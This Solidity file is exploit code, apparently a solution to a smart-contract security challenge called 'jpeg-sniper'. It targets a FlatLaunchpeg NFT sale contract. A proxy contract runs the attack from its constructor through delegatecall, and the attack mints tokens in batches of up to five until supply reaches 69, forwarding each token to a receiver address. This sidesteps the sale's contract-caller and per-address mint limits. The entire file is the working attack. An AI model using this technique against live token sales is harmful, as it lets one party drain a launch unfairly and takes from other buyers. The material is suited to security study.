// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {FlatLaunchpeg} from "src/jpeg-sniper/FlatLaunchpeg.sol";

contract ExploiterProxy {
    constructor(address nftReceiver, address nftLaunch, address impl) payable {
        (bool success, ) = impl.delegatecall(abi.encodeWithSelector(
            ExploiterImpl.attack.selector,
            nftReceiver,
            nftLaunch
        ));

        assert(success);
    }
}

contract ExploiterImpl {
    function attack(address nftReceiver, address nftLaunch) public payable {
        while (FlatLaunchpeg(nftLaunch).totalSupply() < 69) {
            uint256 startId = FlatLaunchpeg(nftLaunch).totalSupply();
            uint256 leftOver = 69 - startId;
            if (leftOver > 5) leftOver = 5;
            FlatLaunchpeg(nftLaunch).publicSaleMint(leftOver);

            for (uint256 i = startId; i < startId + leftOver; i++) {
                FlatLaunchpeg(nftLaunch).transferFrom(address(this), nftReceiver, i);
            }
        }
    } 
}